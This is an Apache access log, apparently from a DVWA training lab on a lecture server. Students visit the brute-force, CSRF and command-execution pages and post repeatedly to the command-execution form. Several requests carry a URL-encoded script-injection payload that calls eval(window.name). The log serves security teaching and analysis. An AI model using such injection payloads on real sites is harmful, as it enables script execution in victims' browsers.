211.219.10.204 - - [08/Jul/2024:07:25:55 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5330 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:25:55 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 625 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:25:56 +0000] "-" 408 0 "-" "-"
127.0.0.1 - - [08/Jul/2024:07:26:02 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
211.219.10.204 - - [08/Jul/2024:07:26:03 +0000] "GET /vulnerabilities/brute/ HTTP/1.1" 200 1781 "http://lecture.devsmile.com:9090/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:03 +0000] "POST /security.php HTTP/1.1" 302 452 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:03 +0000] "GET /security.php HTTP/1.1" 200 2472 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "GET /security.php HTTP/1.1" 200 2472 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "GET /vulnerabilities/csrf/ HTTP/1.1" 200 1751 "http://lecture.devsmile.com:9090/vulnerabilities/brute/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "GET /security.php HTTP/1.1" 200 2472 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:04 +0000] "GET /security.php HTTP/1.1" 200 2474 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:05 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:05 +0000] "GET /security.php HTTP/1.1" 200 2473 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:05 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:05 +0000] "GET /security.php HTTP/1.1" 200 2473 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:06 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:06 +0000] "GET /security.php HTTP/1.1" 200 2472 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:06 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:06 +0000] "GET /security.php HTTP/1.1" 200 2474 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:06 +0000] "GET /vulnerabilities/exec/ HTTP/1.1" 200 1715 "http://lecture.devsmile.com:9090/vulnerabilities/csrf/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:07 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:07 +0000] "GET /security.php HTTP/1.1" 200 2473 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:08 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:08 +0000] "GET /security.php HTTP/1.1" 200 2473 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:05 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1901 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:09 +0000] "GET / HTTP/1.1" 200 3011 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:09 +0000] "POST /security.php HTTP/1.1" 302 424 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:09 +0000] "GET /security.php HTTP/1.1" 200 2471 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:10 +0000] "GET /vulnerabilities/exec/ HTTP/1.1" 302 485 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0; wbx 1.0.0; wbxapp 1.0.0; Zoom 3.6.0)"
211.219.10.204 - - [08/Jul/2024:07:26:10 +0000] "GET /login.php HTTP/1.1" 200 1132 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0; wbx 1.0.0; wbxapp 1.0.0; Zoom 3.6.0)"
211.219.10.204 - - [08/Jul/2024:07:26:10 +0000] "POST /security.php HTTP/1.1" 302 424 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:10 +0000] "GET /security.php HTTP/1.1" 200 2470 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:11 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1722 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:11 +0000] "POST /security.php HTTP/1.1" 302 427 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:11 +0000] "GET /security.php HTTP/1.1" 200 2473 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:09 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1899 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:09 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1901 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:13 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1721 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:13 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:13 +0000] "GET /security.php HTTP/1.1" 200 2470 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:13 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1721 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:11 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1902 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:16 +0000] "GET /security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1" 200 2456 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:16 +0000] "GET /vulnerabilities/exec/ HTTP/1.1" 200 1716 "http://lecture.devsmile.com:9090/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:12 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1899 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:18 +0000] "GET /security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1" 200 2457 "http://lecture.devsmile.com:9090/security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:18 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1722 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:19 +0000] "GET /security.php?phpids=on HTTP/1.1" 302 340 "http://lecture.devsmile.com:9090/security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:19 +0000] "GET /security.php HTTP/1.1" 200 2470 "http://lecture.devsmile.com:9090/security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:20 +0000] "GET /security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1" 200 371 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:17 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1897 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:17 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1898 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:16 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1902 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:18 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1899 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:24 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:24 +0000] "GET /security.php HTTP/1.1" 200 2474 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:24 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:24 +0000] "GET /security.php HTTP/1.1" 200 2472 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:25 +0000] "POST /security.php HTTP/1.1" 302 451 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:26:25 +0000] "GET /security.php HTTP/1.1" 200 2474 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:22 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1899 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:25 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1722 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:18 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1902 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:26:24 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1901 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:17 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1900 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
127.0.0.1 - - [08/Jul/2024:07:26:30 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
127.0.0.1 - - [08/Jul/2024:07:26:31 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
127.0.0.1 - - [08/Jul/2024:07:26:33 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
127.0.0.1 - - [08/Jul/2024:07:26:36 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
211.219.10.253 - - [08/Jul/2024:07:26:45 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1722 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:32 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1802 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:51 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1722 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:26:57 +0000] "-" 408 0 "-" "-"
211.219.10.253 - - [08/Jul/2024:07:26:57 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1914 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:45 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1802 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:53 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1900 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:52 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1900 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:26:51 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1801 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:27:02 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1899 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
127.0.0.1 - - [08/Jul/2024:07:27:31 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.25 (Debian) (internal dummy connection)"
211.219.10.204 - - [08/Jul/2024:07:28:14 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1910 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.253 - - [08/Jul/2024:07:28:19 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1898 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:28:22 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1895 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:28:24 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1905 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:28:28 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1722 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:28:34 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1899 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:28:42 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1908 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.253 - - [08/Jul/2024:07:28:51 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1909 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:29:05 +0000] "-" 408 0 "-" "-"
211.219.10.253 - - [08/Jul/2024:07:29:09 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 2262 "http://lecture.devsmile.com:9090/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
211.219.10.204 - - [08/Jul/2024:07:29:28 +0000] "GET /security.php HTTP/1.1" 200 2457 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:29:29 +0000] "GET /security.php HTTP/1.1" 200 2457 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:29:29 +0000] "GET /security.php HTTP/1.1" 200 2457 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
211.219.10.204 - - [08/Jul/2024:07:29:30 +0000] "GET /security.php HTTP/1.1" 200 2455 "http://lecture.devsmile.com:9090/security.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
